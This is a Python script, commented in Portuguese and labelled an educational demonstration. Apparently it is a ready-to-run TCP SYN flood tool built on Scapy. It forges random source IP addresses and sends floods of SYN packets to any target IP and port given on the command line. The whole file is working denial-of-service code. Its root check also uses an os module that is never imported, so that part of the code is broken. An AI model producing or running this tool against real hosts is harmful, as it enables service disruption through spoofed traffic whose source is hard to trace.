#!/usr/bin/env python3
"""EXPLORAÇÃO DE SERVIÇO - ATAQUE DE NEGAÇÃO DE SERVIÇO (DoS)
Demonstração educacional de um ataque TCP SYN Flood usando Scapy.
"""
import sys
import argparse
import time
from scapy.all import IP, TCP, send, RandShort, RandIP

class ServiceExploit:
    """Executa um ataque de TCP SYN Flood contra um alvo."""
    
    def __init__(self, target_ip: str, target_port: int, packet_count: int = 1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_count = packet_count
        
    def syn_flood_attack(self):
        """Executa o ataque SYN Flood."""
        print(f"[*] Iniciando ataque TCP SYN Flood contra {self.target_ip}:{self.target_port}")
        print(f"[*] Pacotes a enviar: {self.packet_count}")
        
        # 1. Construir o pacote
        # IP: Endereço de origem aleatório (spoofing)
        # TCP: Porta de origem aleatória, porta de destino alvo, flag SYN
        
        # Camada IP: Endereço de origem aleatório (spoofing)
        ip_layer = IP(src=RandIP(), dst=self.target_ip)
        
        # Camada TCP: Porta de origem aleatória, porta de destino alvo, flag SYN
        tcp_layer = TCP(sport=RandShort(), dport=self.target_port, flags="S")
        
        # Pacote final
        packet = ip_layer / tcp_layer
        
        # 2. Enviar os pacotes
        start_time = time.time()
        try:
            # O loop send() é mais rápido que o loop for + send()
            send(packet, count=self.packet_count, verbose=0)
            
            duration = time.time() - start_time
            print(f"[+] Ataque concluído. {self.packet_count} pacotes SYN enviados em {duration:.2f} segundos.")
            
            return {
                "status": "SUCCESS",
                "target": f"{self.target_ip}:{self.target_port}",
                "packets_sent": self.packet_count,
                "duration": f"{duration:.2f}s"
            }
            
        except Exception as e:
            print(f"[!] Erro durante o ataque: {e}")
            return {
                "status": "ERROR",
                "message": str(e)
            }

def main():
    parser = argparse.ArgumentParser(
        description="Exploração de Serviço - Ataque TCP SYN Flood"
    )
    parser.add_argument(
        "--target", "-t",
        required=True,
        help="IP alvo (ex: 192.168.1.1)"
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=80,
        help="Porta alvo (ex: 80)"
    )
    parser.add_argument(
        "--count", "-c",
        type=int,
        default=1000,
        help="Número de pacotes a enviar"
    )
    
    args = parser.parse_args()
    
    exploit = ServiceExploit(
        target_ip=args.target,
        target_port=args.port,
        packet_count=args.count
    )
    
    exploit.syn_flood_attack()

if __name__ == "__main__":
    # Requer privilégios de root para enviar pacotes raw
    if sys.platform != "win32" and os.geteuid() != 0:
        print("[!] Este script requer privilégios de root (sudo) para enviar pacotes raw.")
        sys.exit(1)
        
    main()
